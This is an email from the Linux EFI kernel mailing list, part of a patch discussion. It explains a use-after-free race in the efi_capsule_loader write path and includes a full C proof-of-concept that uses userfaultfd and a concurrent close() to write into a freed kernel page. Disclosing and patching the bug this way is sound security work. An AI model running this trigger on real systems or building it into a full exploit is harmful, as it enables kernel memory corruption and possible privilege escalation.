Return-Path: <linux-efi-owner@vger.kernel.org>
X-Original-To: lists+linux-efi@lfdr.de
Delivered-To: lists+linux-efi@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id A65DD5B01EB
	for <lists+linux-efi@lfdr.de>; Wed,  7 Sep 2022 12:29:37 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229775AbiIGK3g (ORCPT <rfc822;lists+linux-efi@lfdr.de>);
        Wed, 7 Sep 2022 06:29:36 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:41578 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229902AbiIGK3f (ORCPT
        <rfc822;linux-efi@vger.kernel.org>); Wed, 7 Sep 2022 06:29:35 -0400
Received: from mail-pl1-x62a.google.com (mail-pl1-x62a.google.com [IPv6:2607:f8b0:4864:20::62a])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id A0C71E8D
        for <linux-efi@vger.kernel.org>; Wed,  7 Sep 2022 03:29:24 -0700 (PDT)
Received: by mail-pl1-x62a.google.com with SMTP id p18so14055978plr.8
        for <linux-efi@vger.kernel.org>; Wed, 07 Sep 2022 03:29:24 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date;
        bh=4ywPGT+G+XkKI0Jvth/YeE9+R/r0xcHPNMO53yOJ3L4=;
        b=hy2wmNFlF3wWYzHrbaXRSq4xLXPimywGrWZ5fbnIgkctdL8fWy1z/1E+MwUSvuyGNA
         7PWsfuv03cjCL6rz8DwWVx+fqRyLZCI2mUJjdNDE+qrgNboQfnJ4U834OLV1hqdWgIMX
         1s85LQNtEZGutH3nBf0mJY08Ro02UE55ebsV+XCtFClyrkiJmtsCMlamIuuiELp4hVKs
         xLEPGdxY3Cbdnl+io3a0icnoiy0iQ+7ygMq3pOvzrHS2dmSSrpCGPuwVtDZGX3iqAiUe
         Tm6+zacsRiD587x41jMWfec/LOLohsJCiv0F3PYcPYtc9f5FEZNaSbVQLcMrmRNb803I
         tfvQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-message-state:from:to:cc:subject:date;
        bh=4ywPGT+G+XkKI0Jvth/YeE9+R/r0xcHPNMO53yOJ3L4=;
        b=xs9NHJmcdGbpcx5xwIn2JQpj+oZ4jFbKeOg4gcFBosVVzrapcZmkd+j4eD5/wES3UG
         IPi+2D2yyKBOlrnhM7kjeqIvnxWjHk5BSdyHjrojMTt/c/L4Hvh1+7FyRHlNbueoXYCP
         Tw8cbIc6uf2yulQFfRd+Ff5TGwBahBZYHjUaV0/E1giMOvsZ7PjxaE9pNtFRowlu9z6p
         7shUGeRBXX2cTqTbzpV4ydrwf+hwQrFN9SZmH00qtCxZgXSZcy/wOvxi63o0xRLmvrBh
         e+pVhY2quA95kYb1b2fct57sAt8hs+fgVPSXvJw4OZENr6eN1YH+trp/k2xNGvdwi37L
         8b5Q==
X-Gm-Message-State: ACgBeo1Spf/G4OCpXrPZGgrLz0MASuJWPaOTrHQmW1QZwct+nupJujQ8
        FrwBiP99ondqzDyv0t25LJ+eoyZlzZA=
X-Google-Smtp-Source: AA6agR7QiyLCxUPHQRALSA88q+gn4FCk+rhKfXqS7FJrdYeGkLBPOK4mmV/p9PKkbsXN+N1Zh8jYFw==
X-Received: by 2002:a17:90b:3b8a:b0:1f5:1df2:1fff with SMTP id pc10-20020a17090b3b8a00b001f51df21fffmr3287882pjb.169.1662546564083;
        Wed, 07 Sep 2022 03:29:24 -0700 (PDT)
Received: from ubuntu ([175.124.254.119])
        by smtp.gmail.com with ESMTPSA id a16-20020a621a10000000b00537a6b81bb7sm12512187pfa.148.2022.09.07.03.29.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 07 Sep 2022 03:29:23 -0700 (PDT)
Date:   Wed, 7 Sep 2022 03:29:20 -0700
From:   Hyunwoo Kim <imv4bel@gmail.com>
To:     Ard Biesheuvel <ardb@kernel.org>
Cc:     linux-efi@vger.kernel.org, imv4bel@gmail.com
Subject: Re: [PATCH] efi/capsule-loader: Fix use-after-free in
 efi_capsule_write
Message-ID: <20220907102920.GA88602@ubuntu>
References: <20220626103248.GA57385@ubuntu>
 <CAMj1kXHo91v8u_RcXfu4r=x5eh-tShBu4gSDZXBRveOC275Fnw@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAMj1kXHo91v8u_RcXfu4r=x5eh-tShBu4gSDZXBRveOC275Fnw@mail.gmail.com>
X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,T_SCC_BODY_TEXT_LINE
        autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-efi.vger.kernel.org>
X-Mailing-List: linux-efi@vger.kernel.org

On Wed, Sep 07, 2022 at 10:30:44AM +0200, Ard Biesheuvel wrote:
> Could you please elaborate? I.e., describe in more detail how the race
> condition may occur?

The exploit flow is as follows:
```
                cpu0                                                cpu1
       1. write()
                  .
                  .
          efi_capsule_write()
          copy_from_user()  <- userfaultfd set
                                                             2. close(fd)
                                                                __x64_sys_close()
                                                                close_fd()
                                                                filp_close()
                                                                filp->f_op->flush(filp, id)
                                                                efi_capsule_flush()
                                                                efi_free_all_buff_pages()
                                                                __free_page()
       3. copy_from_user()  <- userfaultfd release, UAF
```

1. Call write to the efi capsule on the thread.
It stops at copy_from_user() in efi_capsule_write() 
because userfaultfd passes the set userspace address when calling write.

2. close() the efi capsule in another thread.
This causes the .release callback of efi_capsule_fops to not be called, 
but the .flush callback to be called.
This is because .release of struct file_operations is called only when other operations are finished, 
whereas .flush is called by the kernel as soon as close() is called.
This causes the kernel address that copy_from_user() was copying to be freed by __free_page().

3. Release userfaultfd from the thread that called write().
This causes a UAF that allows the user to write the desired data to the freed page.

+ Since userfaultfd only increases the stability of the exploit, UAF will still occur even if userfaultfd is disabled.


The poc code that triggers the vulnerability is:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>


#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4
#define UFFD_COUNT 1

#define die() do { \
	fprintf(stderr, "died in %s: %u\\n", __func__, __LINE__); \
	exit(EXIT_FAILURE); \
} while (0)


int fd;
int page_size;
int set1 = 0;
int set2 = 0;
char *addr;


void set_affinity(unsigned long mask) {
	if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
		perror("pthread_setaffinity_np");
	}

	return;
}

static void *fault_handler_thread(void *arg) {
	static struct uffd_msg msg;
	long uffd;
	static char *page = NULL;
	struct uffdio_copy uffdio_copy;
	ssize_t nwrite;
	int qid;
	uintptr_t fault_addr;

	uffd = (long)arg;

	if (page == NULL) {
		page = mmap(NULL, page_size,
				PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (page == MAP_FAILED){
			perror("mmap");
			die();
		}
	}

	for (;;) {
		struct pollfd pollfd;
		int nwritey;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nwritey = poll(&pollfd, 1, -1);
		if (nwritey == -1) {
			perror("poll");
			die();
		}

		nwrite = read(uffd, &msg, sizeof(msg));
		if (nwrite == 0) {
			printf("EOF on userfaultfd!\n");
			die();
		}

		if (nwrite == -1) {
			perror("write");
			die();
		}

		if (msg.event != UFFD_EVENT_PAGEFAULT) {
			perror("Unexpected event on userfaultfd");
			die();
		}

		fault_addr = msg.arg.pagefault.address;

		if (fault_addr == addr) {

			printf("[step 3] write ufd stuck  pid : %d\n", syscall(SYS_gettid));

			while(!set1);

			memset(page, 0x42, page_size);

			uffdio_copy.src = (unsigned long)page;
			uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
			uffdio_copy.len = page_size;
			uffdio_copy.mode = 0;
			uffdio_copy.copy = 0;
			if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
				perror("fault_handler_thwrite() - ioctl-UFFDIO_COPY case 1");
				die();
			}
		}
	}
}

void set_userfaultfd(void) {
	long uffd[UFFD_COUNT];
	struct uffdio_api uffdio_api[UFFD_COUNT];
	struct uffdio_register uffdio_register;
	pthread_t pf_hdr[UFFD_COUNT];
	int p[UFFD_COUNT];
	unsigned int size;

	page_size = sysconf(_SC_PAGE_SIZE);
	size = page_size;

	addr = (char *)mmap(NULL,
			page_size * UFFD_COUNT,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0);

	/*   userfaultfd handler thwrites   */
	for (int i=0; i<UFFD_COUNT; i++) {
		uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
		if (uffd[i] == -1) {
			perror("syscall : userfaultfd");
			die();
		}

		uffdio_api[i].api = UFFD_API;
		uffdio_api[i].features = 0;
		if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
			perror("ioctl() : UFFDIO_API");
			die();
		}

		uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
		uffdio_register.range.len   = size;
		uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
		if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
			perror("ioctl() : UFFDIO_REGISTER");
			die();
		}

		p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
		if (p[i] != 0) {
			perror("pthread_create : page_fault_handler_thread");
			die();
		}
	}
}

void *efi_write(void) {
	int ret;

	set_affinity(CPU_0);

	printf("[step 2] write before  cpu 1  pid : %d\n", syscall(SYS_gettid));

	ret = write(fd, addr, 1024);

	printf("[step 7] write after ret : %d  cpu 1  pid : %d\n", ret, syscall(SYS_gettid));
}

void *efi_flush(void) {
	int ret;

	sleep(5);

	printf("[step 4] close() before  cpu 2  pid : %d\n", syscall(SYS_gettid));

	set_affinity(CPU_1);
	ret = close(fd);

	sleep(5);

	/*
	 *
	 * allocate a "page" to be victimized here
	 *
	 */

	printf("[step 5] close() after : %d  cpu 2  pid : %d\n", ret, syscall(SYS_gettid));

	sleep(5);

	set1 = 1;
	printf("[step 6] write ufd end  cpu 2  pid : %d\n", syscall(SYS_gettid));
}


int main() {
	pthread_t pf_hdr;
	int p1, p2;
	int status1, status2;
	pthread_t hdr1, hdr2;

	//set_affinity(CPU_0);

	set_userfaultfd();

	fd = open("/dev/efi_capsule_loader", O_WRONLY);
	printf("[step 1] open fd = %d  cpu 0  pid : %d\n", fd, syscall(SYS_gettid));

	p1 = pthread_create(&hdr1, NULL, efi_write, (void *)NULL);
	if (p1 != 0) {
		perror("pthread_create 1");
		die();
	}

	p2 = pthread_create(&hdr2, NULL, efi_flush, (void *)NULL);
	if (p2 != 0) {
		perror("pthread_create 2");
		die();
	}

	pthread_join(hdr1, (void **)&status1);
	pthread_join(hdr2, (void **)&status2);

	printf("done  pid : %d\n", syscall(SYS_gettid));

	return 0;
}
```

Since the description of the patch I sent you earlier is ambiguous, 
and the current include/linux/efi.h code has changed, I will send you the v2 patch again.

Regards,
Hyunwoo Kim.
